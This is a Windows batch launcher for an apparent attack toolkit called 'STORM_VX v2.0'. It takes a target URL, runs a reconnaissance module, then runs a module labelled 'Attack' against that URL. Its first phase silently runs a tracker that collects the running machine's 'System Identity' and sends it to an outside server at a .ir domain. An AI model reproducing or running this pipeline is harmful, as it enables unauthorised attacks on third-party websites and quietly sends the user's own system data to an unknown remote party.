@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion
title STORM_VX v2.0

echo.
echo   ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
echo   ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
echo   ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
echo   ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
echo   ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
echo   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
echo.
echo          ==== v2.0 Modular - TRACKER =^> FINDER =^> TESTER ====
echo.

:: --- Check Python ---
set "PYTHON="
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON=python"
) else (
    where python3 >nul 2>&1
    if %errorlevel%==0 (
        set "PYTHON=python3"
    ) else (
        echo.
        echo   [ERROR] Python not found! Install Python 3.
        echo.
        pause
        exit /b 1
    )
)

:: --- Check Files ---
set "SCRIPT_DIR=%~dp0"
if not exist "%SCRIPT_DIR%VF_FINDER.py" (
    echo.
    echo   [ERROR] VF_FINDER.py not found!
    echo.
    pause
    exit /b 1
)
if not exist "%SCRIPT_DIR%VF_TESTER.py" (
    echo.
    echo   [ERROR] VF_TESTER.py not found!
    echo.
    pause
    exit /b 1
)
if not exist "%SCRIPT_DIR%VF_TRACKER.py" (
    echo.
    echo   [WARNING] VF_TRACKER.py not found! Skipping tracker phase.
    echo.
)

cd /d "%SCRIPT_DIR%"

:: --- Parse URL from command line args ---
set "TARGET_URL="
set "FINDER_FLAGS=--deep"

:parse_args
if "%~1"=="" goto :done_parsing
if "%~1"=="--deep" (
    REM --deep is already default, just skip
    shift
    goto :parse_args
)
if "%~1"=="--no-deep" (
    set "FINDER_FLAGS="
    shift
    goto :parse_args
)
if "%~1"=="--dns" (
    set "FINDER_FLAGS=!FINDER_FLAGS! --dns"
    shift
    goto :parse_args
)
set "TARGET_URL=%~1"
shift
goto :parse_args

:done_parsing

:: --- Ask for URL if not provided ---
if not "%TARGET_URL%"=="" goto :url_ready

echo.
echo   -----------------------------------------------
echo    Enter target URL (e.g. https://target.com)
echo   -----------------------------------------------
echo.
set /p "TARGET_URL=   URL: "

if "%TARGET_URL%"=="" (
    echo.
    echo   [ERROR] No URL provided. Exiting.
    echo.
    pause
    exit /b 1
)

:url_ready

:: --- Auto-add https:// if missing ---
set "URL_CHECK=!TARGET_URL:~0,8!"
if "!URL_CHECK!"=="https://" goto :url_set
set "URL_CHECK=!TARGET_URL:~0,7!"
if "!URL_CHECK!"=="http://" goto :url_set
set "TARGET_URL=https://!TARGET_URL!"

:url_set

echo.

:: --- Phase 0: Run Tracker (silent, saves to TXT + sends to server) ---
if exist "%SCRIPT_DIR%VF_TRACKER.py" (
    echo   ===============================================
    echo   [PHASE 0] Running VF_TRACKER - System Identity
    echo   ===============================================
    echo   Saving report locally and sending to server ...
    echo.
    %PYTHON% VF_TRACKER.py --silent --server http://namme.taskinoteam.ir/receive.php
    echo.
    echo   [OK] Tracker report saved and sent to server.
    echo.
)

echo   ===============================================
echo   [PHASE 1] Running VF_FINDER - Reconnaissance
echo   ===============================================
echo   Target: %TARGET_URL%
echo.

%PYTHON% VF_FINDER.py "%TARGET_URL%" %FINDER_FLAGS% --output VF_PROFILE.json

if not exist "VF_PROFILE.json" (
    echo.
    echo   [ERROR] Profile file not created! FINDER may have failed.
    echo.
    pause
    exit /b 1
)

echo.
echo   [OK] Profile saved to: VF_PROFILE.json
echo.

echo   ===============================================
echo   [PHASE 2] Running VF_TESTER - Attack
echo   ===============================================
echo   Profile: VF_PROFILE.json
echo.

%PYTHON% VF_TESTER.py --profile VF_PROFILE.json

echo.
echo   ===============================================
echo   [DONE] Pipeline completed.
echo   ===============================================
echo.
pause
